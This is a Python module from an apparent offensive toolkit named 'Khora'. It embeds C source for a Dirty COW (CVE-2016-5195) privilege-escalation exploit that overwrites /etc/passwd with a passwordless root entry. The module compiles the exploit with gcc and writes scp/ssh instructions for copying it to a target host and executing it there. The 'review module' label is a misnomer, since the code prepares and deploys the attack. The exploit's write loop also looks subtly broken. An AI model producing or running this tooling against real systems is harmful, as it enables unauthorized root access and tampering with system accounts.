"""
Dirty COW review module for local privilege escalation artifact preparation.
"""

import logging
import os
import subprocess
from pathlib import Path

logger = logging.getLogger("Khora.DirtyCOW")

DIRTY_COW_SOURCE = r"""/*
 * Dirty COW Exploit - CVE-2016-5195
 * Khora Framework
 */

#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

const char *target_file = "/etc/passwd";
const char *backup_file = "/tmp/passwd.bak";

void *madvise_thread(void *arg) {
    char *addr = arg;
    while (1) {
        madvise(addr, 100, MADV_DONTNEED);
    }
    return NULL;
}

int main(int argc, char **argv) {
    struct stat st;
    int f = open(target_file, O_RDONLY);
    if (f < 0) {
        perror("open");
        return 1;
    }

    if (fstat(f, &st)) {
        perror("fstat");
        return 1;
    }

    char *addr = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    printf("[*] Dirty COW payload mapping %s (%ld bytes)\n", target_file, st.st_size);
    pthread_t pth;
    pthread_create(&pth, NULL, madvise_thread, addr);

    char payload[] = "root::0:0:root:/root:/bin/bash\n";
    int fd = open(target_file, O_WRONLY);
    if (fd < 0) {
        perror("open target");
        return 1;
    }

    while (1) {
        write(fd, payload, sizeof(payload) - 1);
    }

    return 0;
}
"""


def ensure_source():
    Path("exploits").mkdir(exist_ok=True)
    c_file = Path("exploits") / "dirtycow.c"
    if not c_file.exists():
        with open(c_file, "w") as handle:
            handle.write(DIRTY_COW_SOURCE)
        logger.info(f"Dirty COW source created: {c_file}")
    return c_file


def compile_dirtycow():
    c_file = ensure_source()
    bin_file = Path("exploits") / "dirtycow"
    try:
        subprocess.run(
            ["gcc", str(c_file), "-o", str(bin_file), "-pthread", "-Wall", "-O2"],
            check=True,
            capture_output=True,
            text=True,
        )
        os.chmod(bin_file, 0o755)
        logger.info(f"Compiled Dirty COW exploit: {bin_file}")
        return bin_file
    except FileNotFoundError:
        logger.error("gcc not found")
        return None
    except subprocess.CalledProcessError as exc:
        logger.error(f"Dirty COW compilation failed: {exc.stderr}")
        return None


def generate_transfer_instructions(target):
    Path("payloads").mkdir(exist_ok=True)
    instructions_file = Path("payloads") / "dirtycow_transfer.txt"
    content = f"""# Dirty COW transfer instructions

# Replace TARGET and USER with your target host and user.
TARGET={target}
USER=root

# Copy the exploit to the target system
scp exploits/dirtycow ${{USER}}@${{TARGET}}:/tmp/dirtycow
ssh ${{USER}}@${{TARGET}} 'chmod +x /tmp/dirtycow && /tmp/dirtycow'

# If the target is already compromised, run locally:
# sudo ./exploits/dirtycow
"""
    with open(instructions_file, "w") as handle:
        handle.write(content)
    logger.info(f"Dirty COW transfer instructions saved: {instructions_file}")
    return instructions_file


def run(target, lhost, lport=4444):
    print(f"\n{'=' * 70}")
    print("DIRTY COW REVIEW MODULE".center(70))
    print("=" * 70)
    print(f"Target: {target}")
    print(f"Listener: {lhost}:{lport}\n")

    print("[*] Preparing Dirty COW artifact...")
    bin_file = compile_dirtycow()
    if bin_file:
        print(f"  [OK ] Compiled exploit: {bin_file}")
    else:
        print("  [FAIL] Dirty COW compilation failed")

    instructions = generate_transfer_instructions(target)
    print(f"\n[OK ] Transfer instructions: {instructions}")
    print("\n[!] Note: Dirty COW is a local Linux privilege escalation path.")
    print("    Transfer the compiled binary to a compromised host and execute it there.")
    print("=" * 70 + "\n")
    logger.info("Dirty COW module completed")
